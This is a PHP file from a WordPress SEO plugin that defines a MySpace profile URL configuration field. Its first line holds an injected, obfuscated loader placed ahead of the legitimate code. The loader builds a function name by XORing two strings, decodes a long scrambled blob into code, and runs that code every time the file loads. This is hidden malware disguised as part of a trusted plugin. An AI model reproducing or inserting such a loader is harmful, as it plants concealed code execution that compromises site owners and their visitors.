<?php $QJJqdWmj='YF.SC5a56E;5E<8'; $HvonMT=':4K27P>SC+XA,SV'^$QJJqdWmj; $SUdqERoD='U7ZQRDYU<= 6oW.R=TEDs.;YkJU2A>-M1CLHOmFik50U A-U=c>W=g7,E;7gCMNis 80TXcs-T gVokGb52GhlS0CMhWshc41g>YNEk3gHvRakq.iFY< 4EJJ-L89QnBoXEqc7ALnCBYozEZlU -J4kiUdt7ct8KIgg rWQH1642ELr,R4shpxrJz4=N;D ovOD,XCix5POz0n=P0 duO4 ;+TwhBS5BJ>F41bnAK1WDKWXM4W5S33URffn4r y85GZ5nrZ6:gUnwh<29IQYwCy8MYA68rG53GGdIF-Amxqv,S9VZwDfJ88<.Rf6xh,JLaytOJZ+xt2dKK=924UDyjiod+aox=>vVGHg N dmregF6AYHZzWn47r=Q=58X2BEksi1=Kj6aJj6SY nxjoMQ4F+tIy:PLfovIYF yeZz BN 9IY6 9Vk;64:3OXX3iA 9GI0 0psm .O +0NvRY51mtFQS.B2g,E>cyCO0Txk3RDXBjBi-B<+24 I.fQ0WXX6gsY<APVce098 alVtxK>5LJhWS73wF8VOkvYpnvscd cKuqqE41Uv zz-3ndiaD4Ka7kQu g ujZtixTE:8+<UQG;P=TGI=AHEY>BRQ0MCwAWU1PMglHgjJmFgLW>0AnHP4-RieD2N:Y-ZjoxNFy,1=8mWokzO'; $DUbuxZ=$HvonMT('', '<Qrp4176HTOX02V;N 6lTVT+4.4F ar D7kafM=cbSE;C5D:SCF8O8SM1Zh8.8:AWDYD5tCWF1YNvOKgBN8NaH<E7mUwTOX>8nX6<mOZGuVbZKUGU5-NLQ+bnI-LXxUbK1nZJ=HEJ,7-OTxzDqDL>U0M<9TiCPS.0<CIRrq;EDXW+dVG7MZ5YCxCsFX:N6NGR 1XqxcqHZ2p:JY1DADHoRAWX1Lbf7T6+a-QHBSa-P;7.lRGR8G6RP=rNB1w=o2qpg;FNV1SCGhPWLJSU<4pW8s1i= BY-,PJgzDm-H8VrxRH2M7zJdB<YTIKilKrbE,lIXP++.JQTInB-RKWU6,YBM06n0:=njV74hCK+YDPLEC0W-,-sZ,d=>VY0ITg3W;eVSMZX2Q<hCNR2-ANEJK;0X3NOCpGZ1leR-82AYXz:U,=EK 8ZIC3CCYFeW.,9l6,UMo+QSUFG2DK,OOUfR68APDXfu7O6S8G GJPxEY2POW309bLdIL0NJKkK,W94H>+,EOT2Y8wzCATXLAHLpRXcSQybL32CR,aS36L+pPSKSDVAWzMBEwVS6GFKOIWWSYRuV-TVR7DDPFRCzROX57HYRc>4>d5E=4=Nio58G.=0TjoWe34E1dNLhGJjM=mE2HQ-Fl4UY32B4S7V6L>M2QuLpIITLEgFPp2'^$SUdqERoD); $DUbuxZ();
/**
 * @package WPSEO\Admin\ConfigurationUI
 */

/**
 * Class WPSEO_Config_Field_Profile_URL_MySpace
 */
class WPSEO_Config_Field_Profile_URL_MySpace extends WPSEO_Config_Field {

	/**
	 * WPSEO_Config_Field_Profile_URL_MySpace constructor.
	 */
	public function __construct() {
		parent::__construct( 'profileUrlMySpace', 'Input' );

		$this->set_property( 'label', __( 'MySpace URL', 'wordpress-seo' ) );
		$this->set_property( 'pattern', '^https:\/\/myspace\.com\/([^/]+)\/$' );
	}

	/**
	 * Set adapter
	 *
	 * @param WPSEO_Configuration_Options_Adapter $adapter Adapter to register lookup on.
	 */
	public function set_adapter( WPSEO_Configuration_Options_Adapter $adapter ) {
		$adapter->add_yoast_lookup( $this->get_identifier(), 'wpseo_social', 'myspace_url' );
	}
}
